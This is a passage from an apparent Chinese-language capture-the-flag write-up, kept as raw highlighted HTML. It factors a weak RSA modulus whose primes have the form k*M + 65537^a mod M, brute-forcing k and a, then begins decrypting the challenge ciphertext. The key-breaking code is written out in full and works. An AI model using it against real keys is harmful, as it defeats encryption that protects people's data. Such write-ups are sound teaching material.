class=\"token number\">277</span><span class=\"token punctuation\">,</span> <span class=\"token number\">281</span><span class=\"token punctuation\">,</span> <span class=\"token number\">283</span><span class=\"token punctuation\">,</span> <span class=\"token number\">293</span><span class=\"token punctuation\">,</span> <span class=\"token number\">307</span><span class=\"token punctuation\">,</span> <span class=\"token number\">311</span><span class=\"token punctuation\">,</span> <span class=\"token number\">313</span><span class=\"token punctuation\">,</span> <span class=\"token number\">317</span><span class=\"token punctuation\">,</span> <span class=\"token number\">331</span><span class=\"token punctuation\">,</span> <span class=\"token number\">337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">347</span><span class=\"token punctuation\">,</span> <span class=\"token number\">349</span><span class=\"token punctuation\">,</span> <span class=\"token number\">353</span><span class=\"token punctuation\">,</span> <span class=\"token number\">359</span><span class=\"token punctuation\">,</span> <span class=\"token number\">367</span><span class=\"token punctuation\">,</span> <span class=\"token number\">373</span><span class=\"token punctuation\">,</span> <span class=\"token number\">379</span><span class=\"token punctuation\">,</span> <span class=\"token number\">383</span><span class=\"token punctuation\">,</span> <span class=\"token number\">389</span><span class=\"token punctuation\">,</span> <span class=\"token number\">397</span><span class=\"token punctuation\">,</span> <span class=\"token number\">401</span><span class=\"token punctuation\">,</span> <span class=\"token number\">409</span><span class=\"token punctuation\">,</span> <span class=\"token number\">419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">421</span><span class=\"token punctuation\">,</span> <span class=\"token number\">431</span><span class=\"token punctuation\">,</span> <span class=\"token number\">433</span><span class=\"token punctuation\">,</span> <span class=\"token number\">439</span><span class=\"token punctuation\">,</span> <span class=\"token number\">443</span><span class=\"token punctuation\">,</span> <span class=\"token number\">449</span><span class=\"token punctuation\">,</span> <span class=\"token number\">457</span><span class=\"token punctuation\">,</span> <span class=\"token number\">461</span><span class=\"token punctuation\">,</span> <span class=\"token number\">463</span><span class=\"token punctuation\">,</span> <span class=\"token number\">467</span><span class=\"token punctuation\">,</span> <span class=\"token number\">479</span><span class=\"token punctuation\">,</span> <span class=\"token number\">487</span><span class=\"token punctuation\">,</span> <span class=\"token number\">491</span><span class=\"token punctuation\">,</span> <span class=\"token number\">499</span><span class=\"token punctuation\">,</span> <span class=\"token number\">503</span><span class=\"token punctuation\">,</span> <span class=\"token number\">509</span><span class=\"token punctuation\">,</span> <span class=\"token number\">521</span><span class=\"token punctuation\">,</span> <span class=\"token number\">523</span><span class=\"token punctuation\">,</span> <span class=\"token number\">541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">547</span><span class=\"token punctuation\">,</span> <span class=\"token number\">557</span><span class=\"token punctuation\">,</span> <span class=\"token number\">563</span><span class=\"token punctuation\">,</span> <span class=\"token number\">569</span><span class=\"token punctuation\">,</span> <span class=\"token number\">571</span><span class=\"token punctuation\">,</span> <span class=\"token number\">577</span><span class=\"token punctuation\">,</span> <span class=\"token number\">587</span><span class=\"token punctuation\">,</span> <span class=\"token number\">593</span><span class=\"token punctuation\">,</span> <span class=\"token number\">599</span><span class=\"token punctuation\">,</span> <span class=\"token number\">601</span><span class=\"token punctuation\">,</span> <span class=\"token number\">607</span><span class=\"token punctuation\">,</span> <span class=\"token number\">613</span><span class=\"token punctuation\">,</span> <span class=\"token number\">617</span><span class=\"token punctuation\">,</span> <span class=\"token number\">619</span><span class=\"token punctuation\">,</span> <span class=\"token number\">631</span><span class=\"token punctuation\">,</span> <span class=\"token number\">641</span><span class=\"token punctuation\">,</span> <span class=\"token number\">643</span><span class=\"token punctuation\">,</span> <span class=\"token number\">647</span><span class=\"token punctuation\">,</span> <span class=\"token number\">653</span><span class=\"token punctuation\">,</span> <span class=\"token number\">659</span><span class=\"token punctuation\">,</span> <span class=\"token number\">661</span><span class=\"token punctuation\">,</span> <span class=\"token number\">673</span><span class=\"token punctuation\">,</span> <span class=\"token number\">677</span><span class=\"token punctuation\">,</span> <span class=\"token number\">683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">691</span><span class=\"token punctuation\">,</span> <span class=\"token number\">701</span><span class=\"token punctuation\">,</span> <span class=\"token number\">709</span><span class=\"token punctuation\">,</span> <span class=\"token number\">719</span><span class=\"token punctuation\">,</span> <span class=\"token number\">727</span><span class=\"token punctuation\">,</span> <span class=\"token number\">733</span><span class=\"token punctuation\">,</span> <span class=\"token number\">739</span><span class=\"token punctuation\">,</span> <span class=\"token number\">743</span><span class=\"token punctuation\">,</span> <span class=\"token number\">751</span><span class=\"token punctuation\">,</span> <span class=\"token number\">757</span><span class=\"token punctuation\">,</span> <span class=\"token number\">761</span><span class=\"token punctuation\">,</span> <span class=\"token number\">769</span><span class=\"token punctuation\">,</span> <span class=\"token number\">773</span><span class=\"token punctuation\">,</span> <span class=\"token number\">787</span><span class=\"token punctuation\">,</span> <span class=\"token number\">797</span><span class=\"token punctuation\">,</span> <span class=\"token number\">809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">811</span><span class=\"token punctuation\">,</span> <span class=\"token number\">821</span><span class=\"token punctuation\">,</span> <span class=\"token number\">823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">827</span><span class=\"token punctuation\">,</span> <span class=\"token number\">829</span><span class=\"token punctuation\">,</span> <span class=\"token number\">839</span><span class=\"token punctuation\">,</span> <span class=\"token number\">853</span><span class=\"token punctuation\">,</span> <span class=\"token number\">857</span><span class=\"token punctuation\">,</span> <span class=\"token number\">859</span><span class=\"token punctuation\">,</span> <span class=\"token number\">863</span><span class=\"token punctuation\">,</span> <span class=\"token number\">877</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">,</span> <span class=\"token number\">883</span><span class=\"token punctuation\">,</span> <span class=\"token number\">887</span><span class=\"token punctuation\">,</span> <span class=\"token number\">907</span><span class=\"token punctuation\">,</span> <span class=\"token number\">911</span><span class=\"token punctuation\">,</span> <span class=\"token number\">919</span><span class=\"token punctuation\">,</span> <span class=\"token number\">929</span><span class=\"token punctuation\">,</span> <span class=\"token number\">937</span><span class=\"token punctuation\">,</span> <span class=\"token number\">941</span><span class=\"token punctuation\">,</span> <span class=\"token number\">947</span><span class=\"token punctuation\">,</span> <span class=\"token number\">953</span><span class=\"token punctuation\">,</span> <span class=\"token number\">967</span><span class=\"token punctuation\">,</span> <span class=\"token number\">971</span><span class=\"token punctuation\">,</span> <span class=\"token number\">977</span><span class=\"token punctuation\">,</span> <span class=\"token number\">983</span><span class=\"token punctuation\">,</span> <span class=\"token number\">991</span><span class=\"token punctuation\">,</span> <span class=\"token number\">997</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1009</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1013</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1019</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1021</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1031</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1033</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1039</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1049</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1051</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1061</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1063</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1069</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1087</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1091</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1097</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1151</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1163</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1187</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1217</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1223</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1231</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1237</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1249</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1259</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1277</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1279</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1283</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1289</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1291</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1297</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1301</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1303</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1307</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1319</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1327</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1361</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1367</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1373</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1381</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1399</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1409</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1427</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1429</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1433</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1439</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1447</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1451</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1453</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1459</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1471</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1481</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1483</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1487</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1489</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1493</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1499</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1511</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1523</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1531</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1543</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1549</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1553</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1559</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1567</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1571</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1579</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1583</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1597</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1601</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1607</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1613</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1619</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1621</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1627</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1637</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1667</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1669</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1693</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1697</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1699</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1709</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1721</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1723</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1733</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1741</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1753</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1759</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1777</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1783</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1787</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1789</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1801</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1811</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1831</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1847</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1861</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1867</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1871</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1873</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1877</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1879</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1889</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1901</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1907</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1913</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1931</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1933</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1949</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1951</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1973</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1979</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1987</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1993</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1997</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1999</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2003</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2011</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2017</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2027</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2029</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2039</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2053</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2063</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2069</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2081</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2083</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2087</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2089</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2099</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2113</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2131</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2137</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2143</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2161</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2203</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2207</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2221</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2237</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2239</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2243</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2251</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2267</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2269</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2273</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2281</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2287</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2293</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2297</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2309</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2311</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2333</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2339</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2341</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2347</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2351</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2357</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2377</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2381</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2383</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2389</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2393</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2399</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2411</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2437</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2441</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2447</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2459</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2467</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2477</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2503</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2521</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2531</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2539</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2543</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2549</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2551</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2557</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2579</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2591</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2593</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2617</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2621</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2633</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2647</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2659</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2677</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2687</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2689</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2693</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2699</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2707</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2711</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2719</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2731</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2741</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2749</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2753</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2767</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2777</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2789</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2791</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2797</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2801</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2803</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2819</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2833</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2837</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2843</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2851</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2857</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2861</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2879</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2887</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2897</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2903</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2909</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2917</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2927</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2939</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2953</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2957</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2963</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2969</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2971</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2999</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> vals<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    M<span class=\"token operator\">=</span>M<span class=\"token operator\">*</span>primes<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token operator\">=</span>k<span class=\"token operator\">*</span>M<span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token number\">65537</span><span class=\"token operator\">**</span>a <span class=\"token operator\">%</span>M<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k='</span><span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a='</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Number of prime numbers used='</span><span class=\"token punctuation\">,</span>vals<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'======'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'M='</span><span class=\"token punctuation\">,</span>M<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\nPrime='</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>isp <span class=\"token operator\">=</span> number<span class=\"token punctuation\">.</span>isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>isp<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Value is prime'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Value is not prime'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>通过 pub.pwm 来获取 e 和 n</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./pub.pem'</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    key <span class=\"token operator\">=</span> RSA<span class=\"token punctuation\">.</span>import_key<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    e <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>e</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    n <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>n</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#e=65535</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></pre></td></tr></table></figure><p>这里的 n 是 134 位，预估 p 的位数不超过 134/2=67 位，M 代表前 x 项素数的乘积， x 的可选值有 5，16，39，71，80，126。在参数 k 与 a 取值不大的情况下，选取不同的 x 值，得到的 p 的位数不同。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041614575.png\" alt=\"image-20230404161441453\" /></p>\n<p>这里爆破一下求得 pq</p>\n<pre><code>import gmpy2\nM=962947420735983927056946215901134429196419130606213075415963491270\nn=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739\n\nfor k in range(100):\n\tfor a in range(100):\n\t\tp=k*M+(65537**a %M)\n\t\tif n%p==0:\n\t\t\tprint('k=',k)\n\t\t\tprint('a=',a)\n\t\t\tprint('Prime=',p)\n\t\t\tisp = gmpy2.is_prime(p)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041616242.png\" alt=\"image-20230404161647184\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">3386619977051114637303328519173627165817832179845212640767197001941</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">4582433561127855310805294456657993281782662645116543024537051682479</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"02142af7ce70fe0ddae116bb7e96260274ee9252a8cb528e7fdd29809c2a6032727c05526133ae4610ed944572ff1abfcd0b17aa22ef44a2\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 